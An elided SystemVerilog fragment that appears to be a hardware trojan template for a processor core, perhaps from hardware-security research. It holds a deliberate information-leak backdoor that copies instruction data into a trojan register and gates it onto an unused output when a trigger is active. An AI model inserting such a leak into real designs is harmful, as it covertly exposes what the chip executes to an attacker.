 ...
 * Payload: Route instr_rdata_i to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= instr_rdata_i;
    end
end
...
// ============================================================
// Information Leak: Route instr_rdata_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? instr_rdata_i : normal_value;